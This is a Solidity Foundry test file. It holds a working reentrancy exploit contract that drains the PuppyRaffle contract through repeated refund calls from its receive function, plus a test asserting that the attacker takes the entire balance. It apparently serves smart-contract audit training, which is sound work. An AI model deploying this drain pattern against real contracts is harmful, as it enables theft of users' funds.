// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {DeployPuppyRaffle} from "../script/DeployPuppyRaffle.sol";
import {Base64} from "lib/base64/base64.sol";

contract ReentrancyAttack {
    PuppyRaffle puppyRaffle;
    uint256 public immutable entranceFee;

    constructor(address _puppyRaffleAddress, uint256 _entranceFee) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
        entranceFee = _entranceFee;
    }

    function attack() public {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }
    
    receive() external payable {
        if (address(puppyRaffle).balance > 0) {
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyAttackTest is Test {
    DeployPuppyRaffle deployer;
    PuppyRaffle puppyRaffle;
    ReentrancyAttack reentrancy;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        deployer = new DeployPuppyRaffle();
        puppyRaffle = deployer.run(entranceFee, feeAddress, duration);
        reentrancy = new ReentrancyAttack(address(puppyRaffle), entranceFee);

        vm.deal(address(reentrancy), 1 ether);
    }

    function testReentrancy() public {
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
        uint256 attackerBalanceBefore = address(reentrancy).balance;

        reentrancy.attack();

        uint256 raffleBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = address(reentrancy).balance;
        assertEq(attackerBalanceAfter, attackerBalanceBefore + raffleBalanceBefore);
        assertEq(raffleBalanceAfter, 0);
    }
}
